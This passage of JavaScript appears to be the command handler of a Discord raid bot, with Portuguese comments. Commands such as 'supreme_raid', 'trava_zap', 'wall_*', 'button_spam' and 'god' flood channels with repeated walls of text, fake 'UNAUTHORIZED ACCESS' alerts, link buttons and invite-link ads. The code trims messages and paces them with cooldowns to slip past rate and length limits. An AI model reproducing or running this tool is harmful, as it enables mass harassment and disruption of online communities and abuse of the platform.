                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
                }
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'wall_point') {
            const walls = [WALL_1, WALL_2, WALL_3];
            for (let i = 0; i < 5; i++) {
                if (stopSignals.get(user.id)) break;
                for (const w of walls) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: w.substring(0, 1950) }).catch(() => {});
                    await wait(2000); 
                }
            }
        }

        if (commandName === 'wall_square') {
            const walls = [WALL_SQ_1, WALL_SQ_2, WALL_SQ_3];
            for (let i = 0; i < 5; i++) {
                if (stopSignals.get(user.id)) break;
                for (const w of walls) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: w.substring(0, 1950) }).catch(() => {});
                    await wait(2000); 
                }
            }
        }

        if (commandName === 'wall_given') {
            for (const msg of WALL_GIVEN_MSGS) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: msg.substring(0, 1950) }).catch(() => {});
                await wait(2000); 
            }
        }

        if (commandName === 'wall_bar') {
            for (let i = 0; i < 3; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: BAR_MSG_CONTENT.substring(0, 1950) }).catch(() => {});
                await wait(2000);
            }
        }

        if (commandName === 'supreme_raid') {
            for (let i = 0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                // FIX CRÍTICO: .substring para garantir que não passe de 2000
                await interaction.followUp({ content: SUPREME_MSG.substring(0, 1950) }).catch((e) => {
                    console.log("Erro supreme_raid:", e.message); // Log para debug
                });
                await wait(2000);
            }
        }

        if (commandName === 'trava_zap') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                // FIX CRÍTICO: .substring para garantir que não passe de 2000
                await interaction.followUp({ content: TRAVA_ZAP_MSG.substring(0, 1950) }).catch((e) => {
                    console.log("Erro trava_zap:", e.message); // Log para debug
                });
                await wait(2000); 
            }
        }

        if (commandName === 'ponto') {
            const pontoMsg = (PONTO_TEXT + " " + PONTO_TEXT).substring(0, 1900);
            for(let i=0; i < 20; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: pontoMsg }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'chines') {
            if (!CHINES_TEXT) {
                 await interaction.followUp({ content: "⚠️ Conteúdo Chinês não configurado no código.", flags: [MessageFlags.Ephemeral] });
                 return;
            }
            const target = customLink || INVITE;
            const finalMsg = CHINES_TEXT.replace("(Link_aqui_gemini)", `(${target})`);
            const safeMsg = finalMsg.substring(0, 1950);
            for(let i=0; i < 3; i++) { 
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: safeMsg }).catch(() => {});
                await wait(2000);
            }
        }

        if (commandName === 'button_spam') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 50; i++) {
                if (stopSignals.get(user.id)) break; 
                await interaction.followUp({ content: "### ⚠️ **ALERT: UNAUTHORIZED ACCESS**", components: btns }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'say') {
            const t = options.getString('t');
            const q = options.getInteger('q');
            for(let i=0; i < q; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: t.substring(0, 1950) }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'god') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 20; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: GOD_TEXT.substring(0, 1950), components: btns }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }
    });

    client.login(TOKEN).catch(() => {});
};
